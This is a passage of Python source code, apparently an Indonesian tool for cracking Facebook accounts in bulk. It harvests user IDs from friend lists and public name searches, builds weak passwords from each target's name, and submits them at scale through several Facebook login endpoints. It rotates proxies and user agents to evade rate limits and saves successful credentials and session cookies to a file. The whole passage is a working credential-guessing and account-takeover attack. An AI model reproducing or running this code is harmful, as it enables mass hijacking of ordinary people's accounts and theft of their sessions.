                 except:continue
                 yhkk+=1
                 if yhkk<100:
                    gyn = ''+str(yhkk)
                    bool.update({str(yhkk):str(why)})
                    bool.update({gyn:str(why)})
                    prints(Panel(f'''{P2}[{H2}{gyn}{P2}]. Nama file {H2}{why} {P2}total {K2}{len(hem)} {P2}id''',width=80,padding=(0,13),style="light_steel_blue"))
                 else:
                       bool.update({str(yhkk):str(why)})
                       prints(Panel(f'''{P2}[{H2}{gyn}{P2}]. Nama file {H2}{why} {P2}total {K2}{len(hem)} {P2}id''',width=80,padding=(0,13),style="light_steel_blue"))
             yhk = Console().input(f" {P2}[{H2}*{P2}] Masukan nomor file : ")
             try:huft = bool[yhk]
             except KeyError as e:
                Console().print(f''' {P2}[{H2}*{P2}] Pilih nomer file di atas ({H2}1{P2}/{H2}2{P2}/{H2}3{P2}) : ''') ; sleep(3) ; sys.exit()
             try:line = open('/sdcard/SCF-DUMP/'+huft,'r').read().splitlines()
             except:
                     prints(Panel(f'{P2}Opshhh anda tidak memiliki file dump, silahkan dump terlebih dahulu di menu utama dan otomatis file dump anda tersedia di crack file',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.5) ; self.Menuu()
             for xc in line:
                 self.id.append(xc)
             self.setting_uid()
   
   def dump_IdFile(self):
       try:
           cok = open('data/Cookie','r').read()
           tok = open('data/TokenEAAB','r').read()
       except Exception as e:
           prints(Panel(f'{P2}anda belum login {str(e).title()}',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; self.Login()
       prints(Panel(f'{P2}Masukan nama file dump anda, cnth akun.txt, dump,txt, dll',width=80,padding=(0,5),style="light_steel_blue"))
       file = Console().input(f" {P2}[{H2}*{P2}] Masukan nama file dump : ")
       try:idx = int(Console().input(f" {P2}[{H2}*{P2}] Jumlah target : "))
       except:idx=1
       prints(Panel(f'{P2}Anda bisa mengetik {H2}"me" {P2}untuk dump dari list teman anda sendiri',width=80,padding=(0,3),style="light_steel_blue"))
       for XyaaCode in range(idx):
           XyaaCode +=1
           userId = Console().input(f" {P2}[{H2}*{P2}] Masukan id ke {H2}{XyaaCode}{P2} : ")
           try:
                params = (
                   {
                       'access_token': tok,
                       'fields': 'friends'
                   }
                )
                ytta = self.ses.get('https://graph.facebook.com/'+userId, params = params, cookies = {'cookies':cok}).json()
                for xc in ytta["friends"]["data"]:
                    self.id.append(xc["id"]+"|"+xc["name"])
                    Console().print(f" {P2}[{H2}!{P2}] Mengumpulkan {H2}{len(self.id)}",end="\r")
                    open("/sdcard/SCF-DUMP/"+file,'a').write(xc['id']+'|'+xc['name']+'\n')
           except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError) as e:
                prints(Panel(f'{P2}Koneksi kamu buruk pastikan terhubung dengan internet atau WiFi ya',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; sys.exit()
           except KeyError as e:
                prints(Panel(f'{P2}Opshh gagal mengambil id target kemungkinan id tidaklah publik',width=80,padding=(0,3),style="light_steel_blue")) ; sleep(3) ; sys.exit()
       prints(Panel(f'''{P2}Berhasil dump file tersimpan di {H2}/sdcard/SCF-DUMP/{file}''',width=80,padding=(0,5),style="light_steel_blue")) ; sleep(4.1) ; sys.exit()
   
   def dump_Search(self):
       try:
            cok = open('data/Cookie','r').read()
       except IOError as e:
            prints(Panel(f'{P2}anda belum login {str(e).title()}',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; self.Login()
       nama = []
       custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
       custom = [" ranti"," rindu"," duda"," janda"," montok"," tepos"," caca"," cantik"," ganteng"," jancok"," batam"," papua"," crish"," erma"," yanti"]
       custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
       prints(Panel(f'{P2}Silahkan masukan nama target, satu nama setara dengan {H2}10k {P2}target',width=80,padding=(0,2),style="light_steel_blue"))
       nam = Console().input(f' {P2}[{H2}*{P2}] Masukan nama target : ').split(",")
       for ser in nam:
          for belakang in custom:
              ids = ser+belakang
              nama.append(ids)
          for depan in custom2:
              ids = depan+ser
              nama.append(ids)
       with bool(max_workers=35) as thread:
            for ids in nama:
                self.search_Nama("https://mbasic.facebook.com/public/"+ids, cok)
       self.setting_uid()
   
   def search_Nama(self, url, cok):
       r = parser(self.ses.get((str(url)), cookies = {"cookie": cok}).text, "html.parser")
       for x in r.find_all('td'):
           data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
           for uid, nama in data:
               if 'profile.php?' in uid:
                  uid = re.findall('id=(.*)',str(uid))[0]
               elif '<span' in nama:
                   nama = re.findall('(.*?)\<',str(nama))[0]
               bo = uid+"|"+nama
               if bo in self.id:pass
               else:self.id.append(bo)
               Console().print(f" {P2}[{H2}!{P2}] Mengumpulkan {H2}{len(self.id)} {P2}userId...",end="\r")
           if "Lihat Hasil Selanjutnya" in x.text:
              self.search_Nama("https://mbasic.facebook.com"+x.get("href"),cok)
   
   def Check_Hasil(self):
       urut = []
       urut.append(Panel(f'{P2}[{H2}01{P2}]. Check OK',width=23,padding=(0,1),style=f"light_steel_blue"))
       urut.append(Panel(f'{P2}[{H2}02{P2}]. Check CP',width=23,padding=(0,1),style=f"light_steel_blue"))
       urut.append(Panel(f'{P2}[{H2}02{P2}]. Back Menu',width=23,padding=(0,1),style=f"light_steel_blue"))
       Console().print(Columns(urut))
       ykh = Console().input(f''' {P2}[{H2}*{P2}] Pilihan ({H2}1{P2}/{H2}2{P2}/{H2}3{P2}) : ''')
       if ykh =='1' or ykh =='01':
         try:
             yyy = open("OK/live.txt", "r").readlines()
         except FileNotFoundError as e:
             Console().print(f' {P2}[{M2}!{P2}] Opshh anda tidak memiliki file hasil OK') ; sleep(3) ; self.Menuu()
         for xc in yyy:
             tree = Tree('',guide_style="bold grey100")
             tree.add(f'{H2}{xc}')
             prints(tree)
         Console().input(f' {P2}[{H2}*{P2}] Berhasil check hasil OK\n {P2}[{H2}*{P2}] Tekan enter untuk kembali') ; sleep(3) ; self.Menuu()
       elif ykh =='2' or ykh =='02':
           try: 
               yyy = open("CP/check.txt", "r").readlines()
           except FileNotFoundError as e:
               Console().print(f' {P2}[{M2}!{P2}] Opshh anda tidak memiliki file hasil CP') ; sleep(3) ; self.Menuu()
           for xc in yyy:
               tree = Tree('',guide_style="bold grey100")
               tree.add(f'{K2}{xc}')
               prints(tree)
           Console().input(f' {P2}[{H2}*{P2}] Berhasil check hasil CP\n {P2}[{H2}*{P2}] Tekan enter untuk kembali') ; sleep(3) ; self.Menuu()
       elif ykh =='0' or ykh =='00':
           self.Menuu()
       else:prints(Panel(f'{P2}Silahkan masukan pilihan menu di atas yang benar cnth : {H2}1{P2}/{H2}2{P2}/{H2}3{P2} ',width=80,padding=(0,3),style="light_steel_blue")) ; sleep(3.1) ; self.Menuu()

   def Logout(self):
       prints(Panel(f'{P2}Apakah anda yakin ingin menghapus data login anda? (Y/t)',width=80,padding=(0,6),style="light_steel_blue"))
       askk = Console().input(f' {P2}[{H2}*{P2}] Ingin menghapus data login? (Y/t) : ')
       if askk =='y' or askk =='Y':
         try:
             os.remove('data/Cookie')
             os.remove('data/TokenEAAB')
             os.remove('data/TokenEAAG')
         except Exception as e : pass
         prints(Panel(f'{P2}Berhasil menghapus data login anda, terimakasih sudah memakai script saya',width=80,padding=(0,4),style="light_steel_blue")) ; sleep(3) ; sys.exit()
       else:self.Menuu()
   
   def kumpul(self):
       try:
           urut = []
           urut.append(Panel(f"{P2}total {H2}{len(self.id)} {P2}id",padding=(0,2)))
           Console(width=70,style="light_steel_blue").print(Columns(urut),justify="center")
       except:pass

   def setting_uid(self):
       self.kumpul()
       urut = []
       urut.append(Panel(f'{P2}[{H2}01{P2}]. Crack id old',width=23,padding=(0,1),style=f"light_steel_blue"))
       urut.append(Panel(f'{P2}[{H2}02{P2}]. Crack id new',width=23,padding=(0,1),style=f"light_steel_blue"))
       urut.append(Panel(f'{P2}[{H2}03{P2}]. Crack id acak',width=23,padding=(0,1),style=f"light_steel_blue"))
       Console().print(Columns(urut))
       azkkk = Console().input(f''' {P2}[{H2}*{P2}] Setting urutan id ({H2}1{P2}/{H2}2{P2}/{H2}3{P2}) : ''')
       if azkkk =='1' or azkkk =='01':
         for tua in sorted(self.id):
             self.id2.append(tua)
       elif azkkk =='2' or azkkk =='02':
           for muda in sorted(self.id):
               self.muda.append(muda)
           xcid = len(self.muda)
           xcgg = (xcid-1)
           for xcid in range(xcid):
              self.id2.append(self.muda[xcgg])
              xcgg -=1
       elif azkkk =='3' or azkkk =='03':
           for randd in self.id:
               xx = random.randint(0,len(self.id2))
               self.id2.insert(xx, randd)
       else:
               for randd in self.id:
                   xx = random.randint(0,len(self.id2))
                   self.id2.insert(xx, randd)
       urut = []
       urut.append(Panel(f'{P2}[{H2}01{P2}]. Methode {H2}async\n{P2}[{H2}02{P2}]. Methode {H2}reguler\n{P2}[{H2}03{P2}]. Methode {H2}validate',width=35,padding=(0,1),style="light_steel_blue"))
       urut.append(Panel(f'{P2}[{H2}04{P2}]. Methode {H2}graph\n{P2}[{H2}05{P2}]. Methode {H2}messenger\n{P2}[{H2}06{P2}]. Methode {H2}alpha.facebook ',width=35,padding=(0,1),style="light_steel_blue"))
       Console().print(Columns(urut))
       mets = Console().input(f''' {P2}[{H2}*{P2}] Methode login ({H2}1{P2}/{H2}2{P2}/{H2}3{P2}) : ''')
       if mets =='1' or mets =='01':self.methode.append('asyyynccc')
       elif mets =='2' or mets =='02':self.methode.append('reggul')
       elif mets =='3' or mets =='03':self.methode.append('valii')
       elif mets =='4' or mets =='04':self.methode.append('yahud')
       elif mets =='5' or mets =='05':self.methode.append('colmek')
       elif mets =='6' or mets =='06':self.methode.append('ngocok')
       urut = []
       urut.append(Panel(f'{P2}[{H2}01{P2}]. Otomatis',width=23,padding=(0,1),style=f"light_steel_blue"))
       urut.append(Panel(f'{P2}[{H2}02{P2}]. Gabungan',width=23,padding=(0,1),style=f"light_steel_blue"))
       urut.append(Panel(f'{P2}[{H2}03{P2}]. Manual',width=23,padding=(0,1),style=f"light_steel_blue"))
       Console().print(Columns(urut))
       pww = Console().input(f''' {P2}[{H2}*{P2}] Password ({H2}1{P2}/{H2}2{P2}/{H2}3{P2}) : ''')
       if pww =='1' or pww =='01':self.pw_otomatis()
       elif pww =='2' or pww =='02':self.pw_gabungan()
       elif pww =='3' or pww =='03':self.pw_manual()
   
   def setting_UserAgent(self):
       try:
            prints(Panel(f'''{P2}Apakah anda ingin menggunakan UserAgent manual untuk crack''',width=80,padding=(0,4),style="light_steel_blue"))
            uass = Console().input(f''' {P2}[{H2}*{P2}] Ingin menggunakan UserAgent manual? (Y/t) : ''')
            if uass =='y' or uass =='Y':
              self.ua_kamu.append('iya')
              prints(Panel(f'''{P2}Silahkan masukan UserAgent device kamu dan pastekan di bawah ini''',width=80,padding=(0,2),style="light_steel_blue"))
              ask = Console().input(f''' {P2}[{H2}*{P2}] Masukan UserAgent : ''')
              self.ua_manual.append(ask)
            else:
                 self.ua_kamu.append('no')
       except Exception as e : pass

   def tampung(self):
       try:
            prints(Panel(f'''{P2}Hasil crack akun {H2}OK {P2}atau {K2}CP {P2}anda tersimpan di folder results''',width=80,padding=(0,4),style="light_steel_blue"))
            urut = []
            urut.append(Panel(f'{H2}{oK}',width=35,padding=(0,5),style="light_steel_blue"))
            urut.append(Panel(f'{K2}{cP}',width=35,padding=(0,5),style="light_steel_blue"))
            Console().print(Columns(urut))
       except Exception as e : pass

   def pw_otomatis(self):
       global prog, des
       self.setting_UserAgent() ; self.tampung()
       prints(Panel(f'''{P2}Hidupkan mode pesawat di {H2}200{P2}/{H2}500{P2} untuk terhindar dari spam ip''',width=80,padding=(0,3),style=f"light_steel_blue"))
       prog = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
       des = prog.add_task('',total=len(self.id))
       with prog:
          with Ndobol(max_workers=30) as bool:
              for user in self.id2:
                  uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                  depan = nama.split(" ")[0]
                  pasw = []
                  user = user.lower()
                  if len(nama)<6:
                    if len(depan)<3:pass
                    else:
                         pasw.append(nama)
                         pasw.append(depan+"123")
                         pasw.append(depan+"1234")
                         pasw.append(depan+"12345")
                         pasw.append(depan+"123456")
                  else:
                     if len(depan)<3:pasw.append(nama)
                     else:
                          pasw.append(nama)
                          pasw.append(depan+"123")
                          pasw.append(depan+"1234")
                          pasw.append(depan+"12345")
                          pasw.append(depan+"123456")
                     if 'asyyynccc' in self.methode:
                       bool.submit(self.async__, uid, pasw)
                     elif 'reggul' in self.methode:
                         bool.submit(self.Reguller___, uid, pasw)
                     elif "valii" in self.methode:
                         bool.submit(self.Mbasicc__, uid, pasw)
                     elif "yahud" in self.methode:
                         bool.submit(self.graph_Apiiii, uid, pasw)
                     elif "colmek" in self.methode:
                         bool.submit(self.Messenger____, uid, pasw)
                     elif "ngocok" in self.methode:
                         bool.submit(self.Alphaaam_, uid, pasw)
                     else:
                          bool.submit(self.Mbasicc__, uid, pasw)
       prints(Panel(f'''\r{P2}crack dengan {H2}{str(len(self.id))}{P2} id sukses, hasil OK-:{H2}{str(len(self.cp))} {P2}hasil CP-:{K2}{str(len(self.ok))}''',width=80,padding=(0,6),style=f"light_steel_blue")) ; sleep(3.4) ; sys.exit()
   
   def pw_gabungan(self):
       global prog, des
       prints(Panel(f'''{P2}Masukan password gabungan anda usahakan target 1 kota ya''',width=80,padding=(0,5),style=f"light_steel_blue"))
       pw_gabungan = Console().input(f''' {P2}[{H2}*{P2}] Buat password anda : ''')
       self.setting_UserAgent() ; self.tampung()
       prints(Panel(f'''{P2}Hidupkan mode pesawat di {H2}200{P2}/{H2}500{P2} untuk terhindar dari spam ip''',width=80,padding=(0,3),style=f"light_steel_blue"))
       password_gabungan = pw_gabungan.split(',')
       for xpw in password_gabungan:
           self.pwnya.append(xpw)
       prog = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
       des = prog.add_task('',total=len(self.id))
       with prog:
           with Ndobol(max_workers=30) as bool:
                for user in self.id2:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    depan = nama.split(" ")
                    try:
                         if len(nama) <=5:
                           if len(depan) <=1 or len(depan) <=2:pass
                           else:pasw = [nama]
                         else:pasw = [nama]
                         for xpwd in self.pwnya:
                             pasw.append(xpwd)
                         if 'asyyynccc' in self.methode:
                            bool.submit(self.async__, uid, pasw)
                         elif 'reggul' in self.methode:
                             bool.submit(self.Reguller___, uid, pasw)
                         elif "valii" in self.methode:
                             bool.submit(self.Mbasicc__, uid, pasw)
                         elif "yahud" in self.methode:
                             bool.submit(self.graph_Apiiii, uid, pasw)
                         elif "colmek" in self.methode:
                             bool.submit(self.Messenger____, uid, pasw)
                         elif "ngocok" in self.methode:
                             bool.submit(self.Alphaaam_, uid, pasw)
                         else:
                             bool.submit(self.Mbasicc__, uid, pasw)
                    except:pass
       prints(Panel(f'''\r{P2}crack dengan {H2}{str(len(self.id))}{P2} id sukses, hasil OK-:{H2}{str(len(self.cp))} {P2}hasil CP-:{K2}{str(len(self.ok))}''',width=80,padding=(0,6),style=f"light_steel_blue")) ; sleep(3.4) ; sys.exit()
   
   def pw_manual(self):
       global prog, des
       prints(Panel(f'''{P2}Kata sandi minimal 6 karakter, gunakan "," ({H2}koma{P2}) untuk pemisah''',width=80,padding=(0,3),style=f"light_steel_blue"))
       pw_manual = Console().input(f''' {P2}[{H2}*{P2}] Buat kata sandi anda : ''')
       if len(pw_manual)<=5:
          prints(Panel(f'''{P2}Kata sandi minimal {H2}6{P2} karakter silahkan coba lagi ya''',width=80,padding=(0,9),style=f"light_steel_blue"))
          sleep(3.3) ; sys.exit()
       self.setting_UserAgent() ; self.tampung()
       prints(Panel(f'''{P2}Hidupkan mode pesawat di {H2}200{P2}/{H2}500{P2} untuk terhindar dari spam ip''',width=80,padding=(0,3),style=f"light_steel_blue"))
       password_manual = pw_manual.split(',')
       for xpw in password_manual:
           self.pwnya.append(xpw)
       prog = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
       des = prog.add_task('',total=len(self.id))
       with prog:
           with Ndobol(max_workers=30) as bool:
                for user in self.id2:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    depan = nama.split(" ")
                    pasw = []
                    for xpwd in self.pwnya:
                        pasw.append(xpwd)
                    if 'asyyynccc' in self.methode:
                       bool.submit(self.async__, uid, pasw)
                    elif 'reggul' in self.methode:
                        bool.submit(self.Reguller___, uid, pasw)
                    elif "valii" in self.methode:
                        bool.submit(self.Mbasicc__, uid, pasw)
                    elif "yahud" in self.methode:
                         bool.submit(self.graph_Apiiii, uid, pasw)
                    elif "colmek" in self.methode:
                         bool.submit(self.Messenger____, uid, pasw)
                    elif "ngocok" in self.methode:
                         bool.submit(self.Alphaaam_, uid, pasw)
                    else:
                         bool.submit(self.Mbasicc__, uid, pasw)
       prints(Panel(f'''\r{P2}crack dengan {H2}{str(len(self.id))}{P2} id sukses, hasil OK-:{H2}{str(len(self.cp))} {P2}hasil CP-:{K2}{str(len(self.ok))}''',width=80,padding=(0,6),style=f"light_steel_blue")) ; sleep(3.4) ; sys.exit()

   def async__(self, uid, pasw):
       prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.cp)}[/] - {K2}{len(self.ok)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
       prog.advance(des) 
       ses = requests.Session()
       for pw in pasw:
           try:
               if 'iya' in self.ua_kamu : ua = self.ua_manual[0]
               else:ua = random.choice(userAgent2)
               port = random.choice(self.prox)
               proxylist = {'http': 'socks5://'+port}
               link = ses.get("https://m.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbizweb_landing_fb_login_button%26biz_login_source%3Dbizweb_landing_fb_login_button&ref=dbl&fl&login_from_aymh=1")
               data = {
                 "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                 "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                 "try_number":0,
                 "unrecognized_tries":0,
                 "email":uid,
                 "prefill_contact_point":f"{uid} {pw}",
                 "prefill_source":"browser_dropdown",
                 "prefill_type":"password",
                 "first_prefill_source":"browser_dropdown",
                 "first_prefill_type":"contact_point",
                 "had_cp_prefilled":True,
                 "had_password_prefilled":True,
                 "is_smart_lock":False,
                 "bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                 "bi_wvdp":'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                 "encpass": f"#PWD_BROWSER:0:{str(mark()).split('.')[0]}:{pw}",
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
               }
               headers = {
                 "Host": "m.facebook.com",
                 "Connection": "keep-alive",
                 "Content-Length": "1737",
                 "X-FB-LSD": "AVo7puhGLSo",
                 "X-ASBD-ID": "129477",
                 "User-Agent": ua,
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Accept": "*/*",
                 "Origin": "https://m.facebook.com",
                 "X-Requested-With": "mark.via.gp",
                 "Sec-Fetch-Site": "same-origin",
                 "Sec-Fetch-Mode": "cors",
                 "Sec-Fetch-Dest": "empty",
                 "Referer": "https://m.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbizweb_landing_fb_login_button%26biz_login_source%3Dbizweb_landing_fb_login_button&ref=dbl&fl&login_from_aymh=1",
                 "Accept-Encoding": "gzip, deflate",
                 "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
               }
               response = ses.post('https://m.facebook.com/login/device-based/login/async/?next=https%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbizweb_landing_fb_login_button%26biz_login_source%3Dbizweb_landing_fb_login_button&refsrc=deprecated&lwv=100', data = data, headers = headers, proxies = proxylist, allow_redirects=True)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  coki = "sb=" + cooz["sb"] + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{K2}{uid}|{pw}|{cektahun(uid)}")
                  tree.add(f'{K2}{ua} {ua}')
                  prints(tree)
                  kntl = (f"[✓] {uid}|{pw}|{kuki}")
                  self.ok.append(kntl)
                  with open("OK/live.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    yks = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(22)))
                    ytol = (''.join(random.choice('1234567890abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(17)))
                    jasmin = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(12)))
                    fdx = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(5)))
                    pls = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(11)))
                    oka = (''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for y in range(6)))
                    itil = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(23)))
                    xcs = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
                    pwz = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(9)))
                    aze = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(5)))
                    aok = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
                    tree = Tree(f"\r",guide_style="bold grey100")
                    tree.add(f"{H2}{uid}|{pw}")
                    tree.add(f'{H2}datr={yks}-H;fr={ytol}.{fdx}_{jasmin}-nKx-{aze}.{aok}.al.AAA.0.0.{oka}.{pls};sb={itil};c_user={uid};xs=1%{pwz}_{xcs}%3A2%3A{str(random.randint(1000000000,9999999999))}%3A-1%3A{str(random.randint(10000,90000))};m_page_voice={uid} {ua}')
                    prints(tree)
                    kntl = (f"[✓] {uid}|{pw}")
                    self.cp.append(kntl)
                    with open("OK/live.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.ok)}[/] - {K2}{len(self.cp)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def Reguller___(self, uid, pasw):
       prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.cp)}[/] - {K2}{len(self.ok)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
       prog.advance(des) 
       ses = requests.Session()
       for pw in pasw:
           try:
               if 'iya' in self.ua_kamu : ua = self.ua_manual[0]
               else:ua = RedmiRandom()
               port = random.choice(self.prox)
               proxylist = {'http': 'socks5://'+port}
               link = ses.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
               data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                 "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                 "try_number":0,
                 "unrecognized_tries":0,
                 "email":uid,
                 "pass":pw,
                 "login":"Masuk",
                 "bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)
               }
               headers = {
                  "Host": "free.facebook.com",
                  "Connection": "keep-alive",
                  "Content-Length": "183",
                  "Cache-Control": "max-age=0",
                  "Upgrade-Insecure-Requests": "1",
                  "Origin": "https://free.facebook.com",
                  "Content-Type": "application/x-www-form-urlencoded",
                  "User-Agent": ua,
                  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                  "X-Requested-With": "mark.via.gp",
                  "Sec-Fetch-Site": "same-origin",
                  "Sec-Fetch-Mode": "navigate",
                  "Sec-Fetch-User": "?1",
                  "Sec-Fetch-Dest": "document",
                  "Referer": "https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                  "Accept-Encoding": "gzip, deflate",
                  "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
               }
               response = ses.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data = data, headers = headers, proxies = proxylist, allow_redirects=True)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{K2}{uid}|{pw}|{cektahun(uid)}")
                  tree.add(f'{K2}{ua} {ua}')
                  prints(tree)
                  kntl = (f"[✓] {uid}|{pw}|{kuki}")
                  self.ok.append(kntl)
                  with open("OK/live.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    yks = (''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(24)))
                    oki = (''.join(random.choice('1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(17)))
                    aku = (''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(26)))
                    tree = Tree(f"\r",guide_style="bold grey100")
                    tree.add(f"{H2}{uid}|{pw}")
